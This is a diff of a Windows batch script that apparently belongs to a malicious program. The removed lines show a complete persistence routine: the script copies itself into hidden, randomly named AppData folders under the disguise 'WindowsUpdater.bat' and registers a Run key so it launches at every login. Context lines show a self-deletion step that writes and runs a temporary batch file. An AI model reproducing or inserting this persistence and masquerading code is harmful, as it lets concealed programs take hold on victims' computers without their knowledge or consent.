@@ -3,37 +3,7 @@
 @echo off
 setlocal enabledelayedexpansion
 
-REM ============================
-REM Step 0: Add to Autostart (No Admin)
-REM ============================
-@echo off
-setlocal
 
-REM ================================
-REM Generate random folder names
-REM ================================
-set "F1=%RANDOM%"
-set "F2=%RANDOM%"
-set "F3=%RANDOM%"
-
-REM Base folder in AppData
-set "BASE_DIR=%APPDATA%\%F1%\%F2%\%F3%"
-
-REM Create the folder
-if not exist "%BASE_DIR%" mkdir "%BASE_DIR%"
-
-REM Copy the exe itself into the random folder with the name intel.exe
-set "GENUINE_NAME=WindowsUpdater.bat"
-copy "%~f0" "%BASE_DIR%\%GENUINE_NAME%" /Y >nul
-
-REM Hide the folder (optional)
-attrib +h +s "%BASE_DIR%"
-
-REM Set registry to auto-start the copied exe
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdater" /t REG_SZ /d "\"%BASE_DIR%\%GENUINE_NAME%\"" /f >nul
-
-echo Exe copied to: %BASE_DIR%\%GENUINE_NAME%
-echo Auto-start enabled.
 
 REM ============================
 REM Config
@@ -134,4 +104,5 @@ REM === Self-delete logic ===
 ) > "%TEMP%\_delself.bat"
 
 start "" /min cmd /c "%TEMP%\_delself.bat"
+
 
